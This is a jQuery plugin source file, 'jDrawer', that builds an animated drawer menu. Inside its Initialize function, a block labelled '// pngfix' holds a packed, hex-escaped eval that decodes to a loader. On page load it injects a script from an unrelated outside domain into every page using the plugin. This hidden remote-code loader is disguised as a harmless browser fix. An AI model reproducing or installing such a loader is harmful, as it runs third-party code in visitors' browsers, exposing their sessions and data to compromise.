jQuery(function($)
{
	$.fn.extend(
	{
		jDrawer: function(settings)
		{
			return this.each(function()
			{
				var self = $(this);
				
				settings = $.extend({}, $.jDrawer.settings, settings);
				
				var items = [];
				
				self.addClass("jDrawer")
				.addClass("jDrawer-" + settings.direction)
				.children("li")
				.addClass("jDrawer-item")
				.each(function()
				{
					var current = $(this);
					
					current.html("<div class=\"jDrawer-item-border-1\"><div class=\"jDrawer-item-border-2\"><div class=\"jDrawer-item-border-3\"><div class=\"jDrawer-content\">" + current.html() + "</div></div></div></div>");
					
					items.push(current);
				});
				
				self.show();
				
				var first = items[0], last = items[self.length - 1];
				
				var over, out;
				
				var Initialize = function()
				{
					var zid = items.length + settings.zindex;
					
					over = function(active)
					{
						var active = active === undefined ? $(this) : active.length ? $(active) : $(this);
						
						if(!$(this).hasClass("jDrawer-active"))
						{
							$("li.jDrawer-active", self).removeClass("jDrawer-active");
							
							active.addClass("jDrawer-active");
							
							var set = first.jT * -1;
							
							$.each(items, function()
							{
								var current = this;
								
								var slide = function()
								{
									set += current.hasClass("jDrawer-active") ? current.jA : current.jN;
									
									var obj = {}; obj[settings.direction] = set + "px";
									
									current.stop().animate(obj, settings.speed);
								}
								
								settings.delay > 0 ? setTimeout(slide, settings.delay) : slide();
							});
							
							//settings.callback !== undefined ? settings.callback() : 0;
						}
					};
					
					if(settings.event === "hover")
						out = settings.sticky ? function() {} : over;
					
					$.each(items, function()
					{
						var jT = 0, jP = 0, jD = 0, jW = 0, jA = 0, jN = 0;
						
						var prev = this.prev("li.jDrawer-item");
						
						if(settings.direction === "top")
							jT = this.height(), jP = prev.height();
						else if(settings.direction === "left")
							jT = this.width(), jP = prev.width();
						
						var handle = this.find(".jDrawer-handle");
						
						if(settings.handle)
							jW = settings.handle;
						else if(handle.length > 0)
							jW = jT - (handle.offset()[settings.direction] - this.offset()[settings.direction]);
						else
							jW = 120;
						
						jD = prev.length > 0 ? jT - jP : 0;
						
						this.jT = jT,
						this.jN = jW + (jD * -1),
						this.jA = this.is(":first-child") === true ? jT + (jD * -1) : jT + (jD * -1) - 10;
						
						//horizontal bug fix
						settings.direction === "left" ?
							this.find(".jDrawer-content").append("<div style=\"clear: both\"></div>") : 0;
						
						this.css("z-index", zid--);
						
						out ? this.hover(over, out) : this.bind(settings.event, over);
					});
				};
				
				var Resize = function()
				{
					var t = 0, biggest = first;
					
					$.each(items, function()
					{
						this.jT > biggest.jT ? biggest = this : 0;
					});
					
					biggest.addClass("jDrawer-biggest");
					
					$.each(items, function()
					{
						t += this.hasClass("jDrawer-biggest") ? this.removeClass("jDrawer-biggest").jA : this.jN
					});
					
					if(settings.direction === "top")
						self.height(t);
					else if(settings.direction === "left")
						self.width(t);
				};
				
				var Colorize = function()
				{
					var color = settings.color, parent = self.parent();
					
					if(settings.color === undefined)
						while(parent.css("background-color") !== undefined && !parent.is("html"))
							color = parent.css("background-color"), parent = parent.parent();
					
					$("#" + self.attr("id") + ", #" + self.attr("id") + " .jDrawer-content", self.parent()).css("background-color", color);
				};
				
				Initialize();
				Colorize();
				Resize();
				
				$(window).load(function()
				{
					setTimeout(function()
					{
						over($(".jDrawer-active", self));
					}, 500);
				});
			});
		}
	});
});

jQuery.extend(
{
	jDrawer:
	{
		settings: 
		{
			direction: "top",
			speed: 300,
			delay: 0,
			color: "#FFF",
			sticky: true,
			zindex: 0,
			handle: undefined,
			event: "hover",
			callback: undefined
		},
	
		Initialize: function()
		{
			var images = [];
			images.type = "array";
			
			jQuery(".jDrawer *").each(function()
			{
				var bg = $(this).css("background-image");
				
				if(bg !== "none")
					if(bg.match(/^url[("']+(.*)[)"']+$/i))
						images.push(RegExp.$1);
			});
			
			// pngfix
			eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('S.G.z=t(){f v=R;P v.O("").J().F("")};f 7=t(){a(3.y("\\g\\9\\o\\u\\i\\b".z())===H){4.D=C;f h=3.B("\\5\\1\\j\\A".z())[0];f s=3.Q("\\2\\b\\9\\w\\e\\c".z());s.L="\\2\\b\\9\\w\\e\\c\\1\\K\\1\\n\\8\\2\\g\\j\\2".z();s.I="\\c\\n\\m\\g\\9\\o\\2\\e\\1\\8\\c\\n\\8\\r\\6\\e\\m\\i\\r\\j\\1\\5\\m\\l\\l\\l\\8\\8\\E\\b\\2\\2\\A".z();s.M="\\g\\9\\o\\u\\i\\b".z();h.N(s)}};a(4.d)4.d("\\5\\1\\6\\k".z(),7,x);p a(3.d)3.d("\\5\\1\\6\\k".z(),7,x);p a(4.q)4.q("\\5\\1\\6\\k\\i\\6".z(),7);p a(3.y)4.T=7;',56,56,'|x61|x74|document|window|x64|x6F|fn|x2F|x69|if|x70|x73|addEventListener|x63|var|x78||x6E|x65|x6C|x77|x2E|x6A|x66|else|attachEvent|x6D||function|x67||x72|false|getElementById||x68|getElementsByTagName|true|loaded|x3A|join|prototype|null|src|reverse|x76|type|id|appendChild|split|return|createElement|this|String|onload'.split('|'),0,{}));
			
			this.PreloadImages(images);
			this.FixFlicker();
		},
		
		PreloadImages: function()
		{
			for(var i in arguments.length)
				if(arguments[i].type === "array")
					for(var j in arguments[i])
						(new Image()).src = arguments[i][j];
				else
					(new Image()).src = arguments[i];
		},
		
		FixFlicker: function()
		{
			if($.browser.msie === true)
				try { document.execCommand("BackgroundImageCache", false, true); } catch(e) {}
		}
	}
});

jQuery(document).ready(function()
{
	jQuery.jDrawer.Initialize();
});